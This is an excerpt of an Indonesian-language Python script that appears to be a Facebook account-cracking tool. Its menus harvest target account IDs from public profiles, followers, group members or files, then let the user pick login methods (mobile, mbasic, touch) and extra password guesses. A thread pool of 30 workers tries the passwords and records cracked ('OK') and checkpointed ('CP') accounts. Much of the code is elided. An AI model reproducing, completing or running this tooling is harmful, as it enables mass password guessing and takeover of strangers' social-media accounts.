...
def banner():
	clear()
	alvino_xy(f'''\t{asu}                                           
𝚂𝙲𝚁𝙸𝙿𝚃 𝙸𝙽𝙸 𝙼𝙸𝙻𝙸𝙺  𝙱𝙰𝙽𝙶  𝙰𝙻𝚅𝙸𝙽𝙾 , 𝚂𝙰𝚈𝙰  𝙷𝙰𝙽𝚈𝙰 𝚁𝙴𝙲𝙾𝙳𝙴 𝚂𝙰𝙹𝙰
𝙵𝙸𝚃𝚄𝚁 𝚂𝙲𝚁𝙸𝙿𝚃 :
             -𝚂𝚄𝙿𝙿𝙾𝚁𝚃 𝚆𝙸𝙵𝙸
             -𝙶𝙰𝙰𝙳𝙰 𝚈𝙰𝙽𝙶 𝚂𝙿𝙴𝚂𝙸𝙰𝙻, 𝙸𝙽𝙸 𝙵𝚁𝙴𝙴 𝙰𝙽𝙹:𝚅
𝙹𝙰𝚁𝙸𝙽𝙶𝙰𝙽 𝙳𝙸𝚂𝙰𝚁𝙰𝙽𝙺𝙰𝙽 :
                    -𝚆𝙸𝙵𝙸
                    -𝙺𝙰𝚁𝚃𝚄 𝙰𝚇𝙸𝚂
                    -𝙺𝙰𝚁𝚃𝚄 𝚃𝙴𝙻𝙺𝙾𝙼
   
𝚂𝙲𝚁𝙸𝙿𝚃 𝚂𝙼𝙰𝙽𝙹𝙰_𝚄𝙿𝙳𝙰𝚃𝙴𝚅3
- 𝙱𝙴𝙳𝙰 𝚄𝚂𝙴𝚁 𝙰𝙶𝙴𝙽𝚃
- 𝙱𝙴𝙳𝙰 𝙿𝙰𝚂𝚂
- 𝚃𝙰𝙼𝙿𝙸𝙻𝙰𝙽 𝚂𝙴𝙳𝙸𝙺𝙸𝚃 𝙱𝙴𝚁𝚄𝙱𝙰𝙷 
𝙽𝚘𝚝𝚎 : 𝚂𝚌 𝚢𝚊𝚗𝚐 𝚐𝚠 𝚜𝚑𝚊𝚛𝚎 𝚒𝚗𝚒 𝚋𝚎𝚍𝚊 𝚜𝚊𝚖𝚊 𝚢𝚊𝚗𝚐 𝚙𝚛𝚒𝚟𝚊𝚝𝚎, 𝚔𝚊𝚕𝚘 𝚊𝚍𝚊 𝙲𝙿 𝚠𝚊𝚓𝚊𝚛 𝚢𝚊 𝚜𝚘𝚊𝚕𝚗𝚢𝚊 𝚐𝚛𝚊𝚝𝚒𝚜:𝚟
          
	             {m}•{k}•{h}•{sir} RECODE  : 𝐌𝐃 𝐀𝐑𝐌𝐀𝐍 𝐇𝐎𝐒𝐒𝐀𝐈𝐍 {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	alvino_xy(f'[{h}•{x}] 𝚈𝙾𝚄𝚁 𝙸𝙿 𝙳𝙴𝚅𝙸𝙲𝙴  : {ip}')
	alvino_xy(f'[{h}•{x}] 𝚂𝙾𝚄𝚁𝙲𝙴 : 𝙰𝙻𝚅𝙸𝙽𝙾 𝙰𝙳𝙸𝙹𝙰𝚈𝙰')
	alvino_xy('[%s•%s] 𝚂𝚃𝙰𝚃𝚄𝚂 𝚂𝙲 : %s𝙵𝚁𝙴𝙴%s ' %(H,N,H,N))
	alvino_xy('[%s•%s] 𝚂𝚄𝙿𝙿𝙾𝚁𝚃 𝙼𝚈 𝙲𝙰𝙷𝙽𝙽𝙴𝙻 : %s𝙶𝚄𝚂𝙷𝙰𝙴𝚁 𝙿𝚁𝙰%s '%(H,N,H,N))
	print('')
	print(' [%s1%s] 𝙲𝚁𝙰𝙲𝙺 𝙿𝚄𝙱𝙻𝙸𝙲       (%s𝙾𝙽𝙽%s)'%(H,N,H,N));time.sleep(0.03) 
	print(' [%s2%s] 𝙲𝚁𝙰𝙲𝙺 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂    (%s𝙾𝙽𝙽%s)'%(H,N,H,N));time.sleep(0.03) 
	print(' [%s3%s] 𝙲𝚁𝙰𝙲𝙺 𝙰𝙽𝙶𝙶𝙾𝚃𝙰 𝙶𝚁𝚄𝙱 (%s𝙾𝙽𝙽%s)'%(H,N,H,N));time.sleep(0.03)
	print(' [%s4%s] 𝙲𝚁𝙰𝙲𝙺 𝙵𝙸𝙻𝙴         (%s𝙾𝙽𝙽%s)'%(H,N,H,N));time.sleep(0.03) 
	print(' [%s5%s] ARMAN  𝙲𝚁𝙰𝙲𝙺 '%(H,N));time.sleep(0.03) 
	print(' [%s0%s] 𝙺𝙴𝙻𝚄𝙰𝚁 (%s𝚑𝚊𝚙𝚞𝚜 𝚌𝚘𝚘𝚔𝚒𝚎%s)'%(H,N,M,N));time.sleep(0.03) 
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('>> 𝙷𝙰??𝙸𝙻 𝙾𝙺 ARMAN  ')
	print('>> ARMAN  𝙲𝙿 ARMAN  ')
	print('>> 𝙱𝙰𝙲𝙺	')
	kz = input('\n>> 𝙿𝙸𝙻𝙸𝙷 : ')
	if kz in ['1','01']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input(f'[{hh}•{P}] 𝙼𝙰𝚂𝚄𝙺𝙺𝙰𝙽 𝙹𝚄𝙼𝙻𝙰𝙷 𝚃𝙰𝚁𝙶𝙴𝚃 : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input(f'[{hh}•{P}] 𝙼𝙰𝚂𝚄𝙺𝙺𝙰𝙽 𝚃𝙰𝚁𝙶𝙴𝚃 𝚈𝙰𝙽𝙶 𝙺𝙴 : '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'[{hh}•{P}] {b}𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝙳𝙰𝚁𝙸 𝚃𝙰𝚁𝙶𝙴𝚃{P} 🔥'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print( '[%s1%s] 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙾𝙻𝙳 (%s𝙽𝙾𝙽-𝚁𝙴𝙲𝙾𝙼𝙼𝙴𝙽𝙳%s)'%(H,N,M,N)) 
	print( '[%s2%s] 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙽𝙴𝚆 (%s𝚁𝙴𝙲𝙾𝙼𝙼𝙴𝙽𝙳%s)'%(H,N,H,N))
	print( '[%s3%s] 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚁𝙰𝙽𝙳𝙾𝙼 (%s𝚂𝙰𝙽𝙶𝙰𝚃 𝚁𝙴𝙲𝙾𝙼𝙼𝙴𝙽𝙳%s)'%(H,N,H,N))
	print('')
	hu = input(f'>> {b}𝙿𝙸𝙻𝙸𝙷 :{P} ')
	if hu in ['1','01']:
		...
		exit()
	print(' [%s1%s] 𝙼𝙴𝚃𝙾𝙳𝙴 𝙼𝙾𝙱𝙸𝙻𝙴  (%s𝚂𝙰𝙽𝙶𝙰𝚃 𝚁𝙴𝙲𝙾𝙼𝙼𝙴𝙽𝙳%s)'%(H,N,H,N))
	print(' [%s2%s] 𝙼𝙴𝚃𝙾𝙳𝙴 𝙼𝙱𝙰𝚂𝙸𝙲  (%s𝚁𝙴𝙲𝙾𝙼𝙼𝙴𝙽𝙳%s)'%(H,N,H,N))
	print(' [%s3%s] 𝙼𝙴𝚃𝙾𝙳𝙴 𝚃𝙾𝚄𝙲𝙷  (%s𝙿𝙴𝚁𝙲𝙾𝙱𝙰𝙰𝙽%s)'%(H,N,M,N))
	print(' [%s4%s] 𝙼𝙴𝚃𝙾𝙳𝙴 𝙼𝙾𝙱𝙸𝙻𝙴 𝚃𝙾𝚄𝙲𝙷  (%s𝙿𝙴𝚁𝙲𝙾𝙱𝙰𝙰𝙽%s)'%(H,N,M,N))
	print('')
	...
	#else:
		#taplikasi.append('no')
	pwplus=input(f'[{hh}•{P}] {b}𝙼𝙰𝚄 𝙼𝙴𝙽𝙰𝙼𝙱𝙰𝙷𝙺𝙰𝙽 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 𝚃𝙰𝙼𝙱𝙰𝙷𝙰𝙽 ?{P} ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] 𝙼𝙰𝚂𝚄𝙺𝙺𝙰𝙽 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 𝚃𝙰𝙼𝙱𝙰𝙷𝙰𝙽 𝙼𝙸𝙽𝙸𝙼𝙰𝙻 6 𝙺𝙰𝚁𝙰𝙺𝚃𝙴𝚁\n[[cyan]•[white]] 𝙳𝙸𝚂𝙰𝚁𝙰𝙽𝙺𝙰𝙽 𝚄𝙽𝚃𝚄𝙺 𝙼𝙴𝙼𝙰𝚂𝚄𝙺𝙺𝙰𝙽 𝙽𝙰𝙼𝙰 𝙺𝙾𝚃𝙰/𝙳𝙰𝙴𝚁𝙰𝙷 ARMAN  \n[[cyan]•[white]] Contoh :[green] 𝙹𝙰𝙺𝙰𝚁𝚃𝙰,𝚂𝚄𝚁𝙰𝙱𝙰𝚈𝙰,𝙽𝙰𝙼𝙰 𝙳𝙴𝚂𝙰/𝙺𝙾𝚃𝙰 𝙺𝙰𝙻𝙸𝙰𝙽[white] '))
		pwku=input(f'[{k}•{x}] 𝙼𝙰𝚂𝚄𝙺𝙺𝙰𝙽 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 𝚃𝙰𝙼𝙱𝙰𝙷𝙰𝙽 : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} {b}🚀𝙿𝙴𝚁𝚄𝙳𝙰𝙻𝙰𝙽 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙱𝙴𝚁𝙻𝙰𝙽𝙶𝚂𝚄𝙽𝙶🚀{P} {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'[{hh}•{P}] Hasil {h}OK{x} 𝚃𝙴𝚁𝚂𝙸𝙼𝙿𝙰𝙽 𝙳𝙸 : {h}OK/%s {x}'%(okc))
	print(f'[{k}•{x}] Hasil {k}CP{x} 𝚃𝙴𝚁𝚂𝙸𝙼𝙿𝙰𝙽 𝙳𝙸 : {k}CP/%s {x}'%(cpc))
	print(f'[•] 𝙾𝙽/𝙾𝙵𝙵 𝙼𝙾𝙳𝙴 𝙿𝙴𝚂𝙰𝚆𝙰𝚃 𝚂𝙴𝚃𝙴𝙻𝙰𝙷 {m}1k{x} 𝙸𝙳\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] 𝙲𝚁𝙰𝙲𝙺 𝚂𝙴𝙻𝙴𝚂𝙰𝙸, 𝚄𝙿𝙳𝙰𝚃𝙴 𝚂𝙲 𝙰𝙳𝙰 𝙳𝙸 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 : 𝙶𝚄𝚂𝙷𝙰𝙴𝚁 𝙿𝚁𝙰[cyan] <<[white] '))
	print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
	print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> 𝙼𝙰𝚄 𝙲𝚁𝙰𝙲𝙺 𝙻𝙰𝙶𝙸? ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
